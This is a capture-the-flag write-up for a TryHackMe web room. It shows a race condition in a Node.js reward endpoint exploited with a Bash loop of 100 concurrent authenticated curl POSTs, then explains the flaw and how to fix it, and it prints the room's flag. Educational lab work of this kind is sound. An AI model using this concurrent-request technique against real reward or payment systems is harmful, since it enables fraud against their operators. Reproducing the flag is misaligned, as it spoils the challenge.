# Towel on the Sunbed | TryHackMe Hacker Holidays 2026 Day 08 Write-up

## Room Information

| Category | Details |
|---|---|
| Room | Towel on the Sunbed |
| Event | Hacker Holidays 2026 |
| Day | 08 |
| Category | Web Exploitation |
| Focus | Business Logic, Race Conditions, API Abuse |
| Target | `http://10.65.185.235:3000` |

## Introduction

Ponzi's wellness rewards application allows users to claim **50 PONZI every 24 hours**. The goal is to accumulate at least **150 PONZI** and unlock the **Whale Vault**.

After creating an account, the application allows only one reward claim and starts a 24-hour cooldown. However, the room description provides several clues that the daily reward mechanism may be vulnerable to a race condition:

> “He came back to find the sunbed had been claimed three times over while he wasn't looking.”

The challenge was to exploit the gap between the server checking whether a reward could be claimed and recording that the reward had already been claimed.

---

## Task 1: Enumerating the Target

I started by scanning the target using Nmap:

```bash
nmap -sC -sV -Pn 10.65.185.235
```

The scan identified two open ports:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  http    Node.js Express framework
```

Nmap also identified the web application's page title:

```text
Ponzi Portfolio — Login
```

The web application redirected requests to:

```text
/auth/login
```

Since the room is categorized under **Web Exploitation**, the investigation focused on the Node.js Express application running on port `3000`.

The target application was accessed at:

```text
http://10.65.185.235:3000
```
<img width="959" height="272" alt="image" src="https://github.com/user-attachments/assets/3de2a2cd-c6d5-4099-a71f-fcf05faba1d2" />


---

## Task 2: Creating an Account and Exploring the Application

After creating a guest account and logging in, the dashboard displayed the staking rewards section.

The application offered:

- **50 PONZI** for each daily staking reward.
- One claim every **24 hours**.
- Access to the **Whale Vault** after reaching **150 PONZI**.

The dashboard initially showed:

```text
0 / 150 PONZI
```

Clicking the **Claim Reward** button successfully added `50 PONZI` to the account and started a 24-hour cooldown.



The application then displayed:

```text
50 / 150 PONZI

Next claim in: 23:59:xx
```


Since waiting 24 hours was not practical, the reward mechanism required further investigation.

---

## Task 3: Inspecting the Reward Request

Using Burp Suite, I captured the request generated when the **Claim Reward** button was clicked.

The request was:

```http
POST /claim HTTP/1.1
Host: 10.65.185.235:3000
Cookie: connect.sid=<SESSION_COOKIE>
Content-Length: 0
```

The request did not contain a reward amount, balance, or tier value. This indicated that all reward calculations and validation were handled server-side.

The server responded with:

```json
{
  "message": "Staking reward claimed successfully.",
  "reward": 50,
  "newBalance": 50,
  "tier": "Shrimp",
  "priceSnapshot": 4.2
}
```

The application appeared to perform the following operations:

1. Check whether the user had already claimed the daily reward.
2. Add `50 PONZI` to the user's balance.
3. Record that the reward had been claimed.
4. Start the 24-hour cooldown.

If several requests reached the server at almost the same time, multiple requests might pass the eligibility check before the application recorded the first claim.

This indicated a possible **race condition**.



---

## Task 4: Obtaining the Authenticated Session Cookie

To send requests from the terminal, I needed the authenticated session cookie.

In Firefox:

1. I opened the Ponzi dashboard.
2. Pressed `F12`.
3. Opened the **Network** tab.
4. Refreshed the page using `Ctrl + R`.
5. Selected the dashboard request.
6. Copied the complete `Cookie` request header.

The cookie had the following format:

```text
connect.sid=s%3A<SESSION_ID>.<SIGNATURE>
```

I stored the session cookie in a Bash variable:

```bash
COOKIE='connect.sid=PASTE_SESSION_COOKIE_HERE'
```

Before launching the race condition attack, I verified that the session was authenticated:

```bash
curl -i http://10.65.185.235:3000/dashboard -b "$COOKIE"
```

A successful response returned:

```text
HTTP/1.1 200 OK
```

This confirmed that the cookie belonged to the logged-in account.

> **Note:** A fresh account was used for the race condition attack, and the reward was not claimed manually before sending the concurrent requests.


---

## Task 5: Exploiting the Race Condition

The `/claim` endpoint was vulnerable because multiple requests could be processed concurrently.

I used a Bash loop to send `100` POST requests simultaneously:

```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null \
  -X POST http://10.65.185.235:3000/claim \
  -b "$COOKIE" &
done
wait
```

### Command Breakdown

- `seq 1 100` generates 100 requests.
- `curl` sends an HTTP request.
- `-X POST` sends a POST request to the `/claim` endpoint.
- `-b "$COOKIE"` includes the authenticated session cookie.
- `&` runs each request in the background, allowing multiple requests to execute concurrently.
- `wait` pauses the script until all background requests have completed.

Because many requests were sent at nearly the same time, multiple requests were able to pass the reward eligibility check before the application updated the claim state.



---

## Task 6: Unlocking the Whale Vault

After the requests completed, I returned to the Ponzi dashboard and refreshed the page using:

```text
Ctrl + R
```

The account balance had increased beyond the required `150 PONZI`, unlocking the **Whale Vault**.




I then opened the Whale Vault and retrieved the flag.

<img width="1918" height="826" alt="image" src="https://github.com/user-attachments/assets/4cad373b-38ae-41cb-8130-50500219a454" />

---

## Flag

```text
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

---

## Vulnerability Explanation

The application was vulnerable to a **race condition**, also known as a **Time-of-Check to Time-of-Use (TOCTOU)** issue.

The vulnerable logic can be represented as:

```text
Check whether the reward was already claimed
                ↓
Add 50 PONZI to the balance
                ↓
Record the reward as claimed
```

When several requests arrived concurrently, they could all perform the initial eligibility check before the server updated the user's claim status.

As a result, multiple requests were able to award the reward, even though the application intended to allow only one claim every 24 hours.

---

## Remediation

The application could prevent this vulnerability by:

- Using database transactions for the claim operation.
- Performing the eligibility check and balance update atomically.
- Applying row-level locking during the reward claim.
- Using a unique database constraint to enforce one claim per user per reward period.
- Rejecting duplicate requests using server-side idempotency controls.

A secure implementation should ensure that checking eligibility and recording the reward claim occur as a single atomic operation.

---

## Key Takeaways

- Business logic vulnerabilities can exist even when authentication is correctly implemented.
- A cooldown timer in the user interface does not guarantee secure server-side enforcement.
- Concurrent requests can expose race conditions in applications that perform checks and updates separately.
- Session cookies can be used to reproduce authenticated browser requests from the command line.
- Race conditions can allow users to bypass limits, duplicate rewards, or manipulate account balances.
- Critical operations involving balances and rewards should use atomic database transactions.

---

## Tools Used

- Nmap
- Firefox Developer Tools
- Burp Suite
- cURL
- Bash
- TryHackMe AttackBox

---

## Conclusion

The **Towel on the Sunbed** challenge demonstrated how a race condition in a daily reward system could be exploited through concurrent API requests.

By sending multiple authenticated requests to the `/claim` endpoint simultaneously, the application awarded the daily reward more than once. This increased the account balance beyond `150 PONZI`, unlocked the **Whale Vault**, and revealed the flag.

The challenge highlights the importance of implementing sensitive business operations atomically and ensuring that reward claims cannot be processed multiple times during concurrent requests.
